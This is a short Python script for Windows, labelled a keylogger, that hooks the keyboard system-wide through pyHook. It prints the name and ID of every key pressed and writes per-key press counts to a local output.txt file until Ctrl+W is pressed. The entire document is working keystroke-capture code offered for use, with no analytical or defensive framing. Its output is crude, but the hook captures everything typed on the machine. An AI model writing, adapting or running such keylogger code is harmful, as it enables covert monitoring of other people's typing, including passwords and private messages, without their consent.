# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom
import pyHook

num_keys = 223
keys_held = set()
count = []

outfile = open('./output.txt', 'w')
outfile.write('Key,Count\n')
for i in range(num_keys):
    count.append(0)
    outfile.write('-')
    outfile.write('\n')
outfile.close()


def OnKeyDown(event):
    keys_held.add(event.Key)
    if 'Lcontrol' in keys_held and 'W' in keys_held:
        quit()
    print('Key:', event.Key)
    print('KeyID:', event.KeyID)

    outfile = open('./output.txt', 'r+')
    lines = outfile.readlines()

    count[event.KeyID] += 1
    currline = str(event.Key) + ',' + str(count[event.KeyID]) + '\n'
    lines[event.KeyID] = currline
    outfile.seek(0)
    outfile.writelines(lines)
    outfile.close()

    return True


def OnKeyUp(event):
    if event.Key in keys_held:
        keys_held.remove(event.Key)
    return True


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyDown
hm.KeyUp = OnKeyUp
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
